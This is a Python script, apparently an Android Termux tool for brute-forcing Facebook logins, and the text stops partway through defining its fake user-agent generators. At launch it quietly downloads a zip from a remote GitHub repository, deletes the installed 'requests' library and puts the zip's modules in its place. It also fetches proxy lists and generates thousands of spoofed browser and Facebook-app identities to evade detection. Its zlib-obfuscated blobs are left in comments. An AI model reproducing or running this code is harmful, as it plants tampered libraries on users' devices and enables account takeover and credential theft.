import os,zlib,tempfile,subprocess, platform
find_aarch = subprocess.check_output('uname -om',shell=True)
from os import remove as rv 
bx = platform.architecture()[0]

os.system('clear')
print(' follow my github bruh ')
os.system(' xdg-open https://github.com/XERX-XD')
rmt = 'ROHIT-XD-KING'

'''if "arm" in str(find_aarch):
    if os.path.exists('.config.zip'): 
        pass
    else:
        os.system(f'curl https://raw.githubusercontent.com/{rmt}/files/main/config.zip > .config.zip')

elif "aarch64" in str(find_aarch):
    if os.path.exists('.req64.zip'): 
        pass
    else:
        os.system(f'curl https://raw.githubusercontent.com/{rmt}/files/main/req64.zip > .req64.zip')'''
try:
    if os.path.exists('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'):
        pass
    else:
        os.system('pip install requests > /dev/null')
        
except Exception as e:
    print(e)
os.system('touch /data/data/com.termux/files/home/.regex.txt') 
rxt = '/data/data/com.termux/files/home/.regex.txt' 
os.system('rm /data/data/com.termux/files/home/.regex.txt') 
'''rmwala = 
zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x0eL\x0e\x15') 
mvwala = 
zlib.decompress(b'x\x9c\xd3OI,I\xd4\x07\x13\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x0eK\x0e\x19') 
mvdow = zlib.decompress(b'x\x9c-\xca;\x0e\x80 
\x0c\x00\xd0\xab\xf4\x02\xd0\xddY7\'\'VD\x14\x12>\xa6\xb4\xea\xf15\xea\xf2\xa6\xe7\x84\x12\xa8\x11\x02\xf3\xde:D\xb2\xa7\xde"\x07\x99\xa5yr\xb5\xb0/\xac]\xcdh\x86\xc9(\xd3\xe3\x1a\x93o\x98m,\x98\x0fP\x15p\xb1l?\x9e\xa7\xd9S\x96\xebo\xd2\x08\xe7w\xde\xc3\xa8%\xb8') 
rmdow = zlib.decompress(b"x\x9c-\xca1\x0e\x80 
\x0c\x00\xc0\xaf\xf0\x01\xe8\xee\xac\x9b\x93\x13+ 
\n\t\x05SZ\xf5\xf9\x9a\xe8r\xd3\x05\xa1\xa2\xf4\xac\x12\xf3\xd1\x07\x00r\x97\xd93'\xf1\xd2#\x85V9V6\xa1!\xd8i\xb1\xda\x8e\xb0\xe5\x12;\xa0\xcb\x15\x08\x95n\nV\xc7\xee\xe3}\x86#\xa1\xdc\x7f\x93N\xe0\xdf\x89\xe7\x03\xc3\x01%\xb4") 
rmadd = zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfaE\xb9\x00\x90\xf4\x11\x05') 
mvadd = 
zlib.decompress(b'x\x9cK\xce\xc8\xcdOQ077W\xd0OI,I\x84\x10\xc9\xf9\xb9z%\xa9E\xb9\xa5\x15\xfai\x999\xa9\xc5\xfa\xa5\xc5E\xfaI\x99y\xfa\xb9e\x00\x90\xf3\x11\t') '''
if not os.path.exists("/data/data/com.termux/files/usr/bin/rm"):
        pass
        exit("Error in termux modules ")
if os.path.exists(rxt):
    print(' error in modules bruh');exit()
rn = tempfile.mkdtemp(prefix='.')

'''if not os.path.exists(".config.zip"):
    print(' file not found run command from org repo only ');exit()
if not os.path.exists(".req64.zip"):
    print(' file not found run command from org repo only ');exit()'''
if "aarch64" in str(find_aarch):
    os.system(f'curl https://raw.githubusercontent.com/{rmt}/files/main/req64.zip > .req64.zip')
    os.system(f'unzip .req64.zip -d {rn} > /dev/null')

    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/*')

    os.system(f'cp -r {rn}/reqmodule/* /data/data/com.termux/files/usr/lib/python3.11/site-packages/ > /dev/null')
elif "arm" in str(find_aarch):
    os.system(f'curl https://raw.githubusercontent.com/{rmt}/files/main/config.zip > .config.zip')
    os.system(f'unzip .config.zip -d {rn} > /dev/null')
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/*')
    os.system(f'cp -r {rn}/reqmodule/* /data/data/com.termux/files/usr/lib/python3.11/site-packages/ > /dev/null')

import os
import time
import random
import hashlib
import string
import traceback
import subprocess
import hmac
import gzip
import hashlib
import base64
import platform
import json
import sys
import uuid
import re
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as Thread
except Exception as e:
    print(f'\nError:- {e}')
    exit()
from bs4 import BeautifulSoup
try:
    import smtplib
except ModuleNotFoundError:
    print('not found module')
    os.system('pip install smtplib')
import re,json,string,uuid
#------------------------------------------
sim_id=''
fbsvx = subprocess.check_output('getprop ro.build.version.release',shell=True).decode('utf-8').replace('\n','')
modelx = subprocess.check_output('getprop ro.product.model',shell=True).decode('utf-8').replace('\n','')
buildx = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
fbmfx = subprocess.check_output('getprop ro.product.manufacturer',shell=True).decode('utf-8').replace('\n','')
fbbdx = subprocess.check_output('getprop ro.product.brand',shell=True).decode('utf-8').replace('\n','')
fbcax = subprocess.check_output('getprop ro.product.cpu.abilist',shell=True).decode('utf-8').replace(',',':').replace('\n','')
#------------------------------------------
mthd={}
ldd=[]
apc=[]
okcp=[]
loop = 0
oks = []
cps = []
tokenku=[]
id=[]
pro=[]
pro=[]
redmi=[]
ugen=[]
newua=[]
try:
    
    uno = requests.get('https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all').text
    for x in uno.splitlines():pro.append(x)
except requests.exceptions.ConnectionError:
    sys.exit(f" connection error")
sim_hini = str(random.randint(2e4,4e4))
trace_id = str(uuid.uuid4())
q="968"
qq="8280"
qqq="52729"
qqqq="420"
client_id = f"{qqqq}038{q}89{qq}485649{qqq}208"
#------------------------------------------
#useragentss
for xd in range(1000):

    build_nokiax = ['JDQ39','JZO54K']

    rr = random.randint; rc = random.choice
    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
    ugent1 = f"Mozilla/5.0 (Linux; Android 7.1.1 {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    ugent2 = f"Mozilla/5.0 (Linux; Android 12; RMX3393 Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;].{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    ugent3 = f"Mozilla/5.0 (Linux; Android 10 {str(rr(4,12))}; {str(rc(basa))}; Redmi Note 7S Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114;]/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
    memekk = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
    #ugen.append(['Mozilla/5.0 (Linux; Android 12; CPH2145 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:158.148.19.231]' ,'Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:188.216.118.80]' ,'Mozilla/5.0 (Linux; Android 12; SM-A125F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.99 Mobile Safari/537.36'])
    t = random.choice([ugent1, ugent2, ugent3, memekk])
    ugen.append(t)
newua=[]
for xd in range(1000):

    build_nokiax = ['JDQ39','JZO54K']

    rr = random.randint; rc = random.choice
    miui_v3 = ['-g','-gn','-go','-gn','gzip(gfe)',' swan-mibrowser']
    miui_v1 = ['0','1','2','3','4','5','6','7','8','9','10','11','12']
    miui_v2 = ['0','1','2','3','4','5','6','7','8','9','10','11','14','22','27','36']
    aZ = ['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z']
    basa = ['en-us','en-gb','id-id','de-de','ru-ru','en-sg','fr-fr','fa-ir','ja-jp','pt-br','cs-cz','zh-hk','zh-cn','vi-vn','en-ph','en-in','tr-tr']
    gt = ['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550	5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750']
    ugent1 = f"Mozilla/5.0 (Linux; Android 7.1.1 {str(rr(4,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    ugent2 = f"Mozilla/5.0 (Linux; Android 12; RMX3393 Build/{str(rc(build_nokiax))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(100,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/382.0.0.33.111;].{str(rr(1,5))}.1.{str(rr(16,37))} {str(rc(aZ))}{str(rr(1,1000))}"
    ugent3 = f"Mozilla/5.0 (Linux; Android 10 {str(rr(4,12))}; {str(rc(basa))}; Redmi Note 7S Build/QKQ1.190910.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/ Version/4.0 Chrome/{str(rr(40,104))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/385.0.0.32.114;]/{str(rr(1,99))}.{str(rc(miui_v1))}.{str(rc(miui_v2))}{str(rc(miui_v3))} {str(rc(aZ))}{str(rr(1,1000))}"
    memekk = random.choice(['Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'])
    
    #lmd = random choice(['Mozilla/5.0 (Linux; Android 12; CPH2145 Build/RKQ1.211103.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:158.148.19.231]' ,'Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/106.0.5249.126 Mobile Safari/537.36 [ip:188.216.118.80]' ,'Mozilla/5.0 (Linux; Android 12; SM-A125F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.99 Mobile Safari/537.36'])
    t = random.choice([ugent1, ugent2, ugent3, memekk])
    ugen.append(t)
for t in range(10000):
	aa='Mozilla/5.0 (Linux; Android 7.0; '
	b=random.choice(['8.1.0','4','5','6','7','8','9','10','11','12'])
	c='Hisense F102) '
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
def m1file():
    fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
    fbbv = str(random.randint(111111111,999999999))
    fblc = "en_GB"
    fbfw = '1'
    fbcr = 'Airtel'
    fbrv = '0'
    fban = 'FB4A'
    fbpn = random.choice([
        'com.facebook.adsmanager',
        'com.facebook.lite',
        'com.facebook.orca',
        'com.facebook.katana',
        'com.facebook.mlite'])
    ua = 'Dalvik/2.1.0 (Linux; U; Android '+fbsvx+'.0.1; '+modelx+' Build/'+buildx+') [FBAN/'+fban+';FBAV/'+fbav+';FBPN/'+fbpn+';FBLC/'+fblc+';FBBV/'+fbbv+';FBCR/'+fbcr+';FBMF/'+fbmfx+';FBBD/'+fbbdx+';FBDV/'+modelx+';FBSV/'+fbsvx+'.0.1;FBCA/'+fbcax+';FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'.replace('\n','')
    return ua
def m2file():
    redmi_models = ["Redmi Note 11","Redmi 10","Redmi K40","Redmi 9","Redmi Note 10","Redmi 8","Redmi Note 9 Pro","Redmi 7","Redmi Note 8 Pro","Redmi 6A","Redmi Note 8"]
    fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(11, 99)}'
    b = f'{random.randint(111111,999999)}.{random.randint(111,999)}'
    modx = random.choice(redmi_models)
    ua = f'Dalvik/2.1.0 (Linux; U; Android '+str(random.randint(4,13))+'.0.1; '+modx+' Build/QP1A'+b+') [FBAN/FB4A;FBAV/'+fbav+';FBPN/com.facebook.katana;FBLC/en_US;FBBV/'+str(random.randint(000000000,999999999))+';FBCR/Jio 4G;FBMF/Xiaomi;FBBD/Xiaomi;FBDV/Xiaomi '+modx+';FBSV/'+str(random.randint(4,13))+'.0.1;FBCA/'+fbcax+';FBDM/{density='+str(random.randint(1,9))+'.'+str(random.randint(1,9))+',width='+str(random.randint(500,999))+',height='+str(random.randint(999,1999))+'};FB_FW/1;]'.replace('\n','')
    return ua
def m3file():
    realme = random.choice(["RMX2072","RMX2086","RMX3350",])
    e=random.choice(["MMB29T","JZO54K","M1AJQ","KOT49H","TP1A.220624.014"])
    fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(11, 99)}'
    b = f'{random.randint(111111,999999)}.{random.randint(111,999)}'
